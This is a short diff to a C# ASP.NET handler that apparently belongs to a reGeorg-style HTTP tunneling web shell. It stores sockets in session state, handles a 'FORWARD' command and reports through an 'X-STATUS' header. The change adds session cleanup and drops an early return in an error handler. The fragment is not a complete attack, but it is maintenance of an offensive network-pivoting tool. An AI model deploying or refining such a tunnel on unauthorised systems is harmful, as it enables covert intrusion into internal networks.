@@ -47,6 +47,7 @@
                     s.Close();
                 } catch (Exception ex){
                 }
+                Session.Remove(mark);
                 Response.AddHeader("X-STATUS", "OK");
             } else if (cmd == "FORWARD") {
                 Socket s = (Socket)Session[mark];
@@ -78,7 +79,6 @@
                         Response.AddHeader("X-STATUS", "OK");
                     } catch (SocketException soex) {
                         Response.AddHeader("X-STATUS", "OK");
-                        return;
                     }
                 } catch (Exception ex) {
                     Response.AddHeader("X-STATUS", "OK");
